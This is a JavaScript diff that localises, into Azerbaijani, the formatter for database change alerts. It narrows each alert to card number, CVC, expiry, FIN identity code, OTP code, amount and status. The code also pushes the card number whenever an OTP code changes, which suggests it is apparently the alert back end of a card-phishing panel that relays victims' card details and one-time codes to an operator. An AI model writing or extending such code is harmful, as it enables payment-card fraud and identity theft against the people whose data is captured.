@@ -61,6 +61,43 @@ function escapeHtml(s) {
     .replace(/>/g, '&gt;');
 }
 
+// Azerbaijani translations
+const AZ_TRANSLATIONS = {
+  eventTypes: {
+    'INSERT': 'YENİ ƏLAVƏ',
+    'UPDATE': 'YENİLƏNDİ',
+    'DELETE': 'SİLİNDİ'
+  },
+  fields: {
+    'amount': 'Məbləğ',
+    'card_number': 'Kart nömrəsi',
+    'card_type': 'Kart tipi',
+    'cvc': 'CVC',
+    'expiry': 'Bitmə tarixi',
+    'fin_code': 'FIN kod',
+    'otp_code': 'OTP kod',
+    'status': 'Status'
+  },
+  labels: {
+    'New': 'Yeni',
+    'Changed': 'Dəyişikliklər',
+    'Old': 'Köhnə'
+  }
+};
+
+const ALLOWED_FIELDS = ['amount', 'card_number', 'card_type', 'cvc', 'expiry', 'fin_code', 'otp_code', 'status'];
+
+function filterAllowedFields(obj) {
+  if (!obj || typeof obj !== 'object') return {};
+  const filtered = {};
+  for (const key of ALLOWED_FIELDS) {
+    if (key in obj) {
+      filtered[key] = obj[key];
+    }
+  }
+  return filtered;
+}
+
 function maskSensitiveRow(row) {
   if (!row || typeof row !== 'object') return row;
   const out = { ...row };
@@ -81,7 +118,10 @@ function renderValue(v) {
 
 function renderList(obj) {
   return Object.entries(obj)
-    .map(([k, v]) => `• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(v))}</code>`) 
+    .map(([k, v]) => {
+      const label = AZ_TRANSLATIONS.fields[k] || k;
+      return `• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(v))}</code>`;
+    })
     .join('\n');
 }
 
@@ -100,14 +140,17 @@ function diffFields(oldRow = {}, newRow = {}) {
 }
 
 function formatChange(eventType, s, t, rowNew, rowOld) {
-  const header = `<b>${escapeHtml(eventType)}</b> on <code>${escapeHtml(`${s}.${t}`)}</code>`;
+  const eventTypeAz = AZ_TRANSLATIONS.eventTypes[eventType] || eventType;
+  const header = `<b>${escapeHtml(eventTypeAz)}</b> - <code>${escapeHtml(`${s}.${t}`)}</code>`;
+  
   if (eventType === 'INSERT') {
-    const body = renderList(rowNew || {});
-    return `${header}\n<b>New</b>\n${body}`;
+    const filtered = filterAllowedFields(rowNew || {});
+    const body = renderList(filtered);
+    return `${header}\n<b>${AZ_TRANSLATIONS.labels['New']}</b>\n${body}`;
   }
   if (eventType === 'UPDATE') {
-    const oldRow = rowOld || {};
-    const newRow = rowNew || {};
+    const oldRow = filterAllowedFields(rowOld || {});
+    const newRow = filterAllowedFields(rowNew || {});
     const keys = Array.from(new Set([...Object.keys(oldRow), ...Object.keys(newRow)])).sort();
     const lines = [];
     const changedKeys = [];
@@ -116,22 +159,26 @@ function formatChange(eventType, s, t, rowNew, rowOld) {
       const n = newRow[k];
       if (JSON.stringify(o) !== JSON.stringify(n)) {
         changedKeys.push(k);
-        lines.push(`• <b>${escapeHtml(k)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
+        const label = AZ_TRANSLATIONS.fields[k] || k;
+        lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(o))}</code> → <code>${escapeHtml(renderValue(n))}</code>`);
       }
     }
     // If OTP changed, also show card_number even if it didn't change
     if (changedKeys.includes('otp_code') && (newRow.card_number || oldRow.card_number)) {
       const pan = newRow.card_number ?? oldRow.card_number;
-      lines.push(`• <b>card_number</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
+      const label = AZ_TRANSLATIONS.fields['card_number'];
+      lines.push(`• <b>${escapeHtml(label)}</b>: <code>${escapeHtml(renderValue(pan))}</code>`);
     }
     const body = lines.join('\n');
-    return `${header}\n<b>Changed</b>\n${body || 'No visible changes'}`;
+    return `${header}\n<b>${AZ_TRANSLATIONS.labels['Changed']}</b>\n${body || 'Dəyişiklik yoxdur'}`;
   }
   if (eventType === 'DELETE') {
-    const body = renderList(rowOld || {});
-    return `${header}\n<b>Old</b>\n${body}`;
+    const filtered = filterAllowedFields(rowOld || {});
+    const body = renderList(filtered);
+    return `${header}\n<b>${AZ_TRANSLATIONS.labels['Old']}</b>\n${body}`;
   }
-  const body = renderList(rowNew || {}) || renderList(rowOld || {});
+  const filtered = filterAllowedFields(rowNew || rowOld || {});
+  const body = renderList(filtered);
   return `${header}\n${body}`;
 }
 
